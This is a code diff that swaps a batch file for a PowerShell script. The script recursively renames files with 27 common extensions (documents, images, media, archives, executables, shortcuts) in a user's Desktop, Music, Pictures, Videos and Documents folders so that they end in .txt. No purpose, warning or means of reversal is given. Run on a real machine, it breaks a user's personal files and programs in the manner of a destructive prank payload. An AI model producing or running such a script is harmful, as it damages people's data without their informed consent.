@@ -1,11 +1,20 @@
-@echo off
+# List of target directories
+$directories = "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Music", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos", "$env:USERPROFILE\Documents"
 
-REM List of file extensions to rename
-set "extensions=.exe .json .doc .pdf .wpd .docx .rtf .tex .odt .jpg .jpeg .mp3 .rar .vcd .webp .css .html .py .php .ico .lnk .mp4 .js .bak .xml .zip .bmp"
+# List of file extensions to rename
+$extensions = "*.exe", "*.json", "*.doc", "*.pdf", "*.wpd", "*.docx", "*.rtf", "*.tex", "*.odt", "*.jpg", "*.jpeg", "*.mp3", "*.rar", "*.vcd", "*.webp", "*.css", "*.html", "*.py", "*.php", "*.ico", "*.lnk", "*.mp4", "*.js", "*.bak", "*.xml", "*.zip", "*.bmp"
 
-REM Loop through each extension and rename files
-for %%E in (%extensions%) do (
-    REN *%%E *.txt
-)
+# Loop through each directory
+foreach ($directory in $directories) {
+    # Get all files with specified extensions in the current directory and subdirectories
+    $files = Get-ChildItem -Path $directory -File -Recurse -Include $extensions
 
-pause
+    # Rename each file
+    foreach ($file in $files) {
+        $newName = $file.Name -replace "\.(exe|json|doc|pdf|wpd|docx|rtf|tex|odt|jpg|jpeg|mp3|rar|vcd|webp|css|html|py|php|ico|lnk|mp4|js|bak|xml|zip|bmp)$", ".txt"
+        Rename-Item -Path $file.FullName -NewName $newName
+    }
+}
+
+Write-Host "File renaming completed."
+Read-Host "Press Enter to exit."
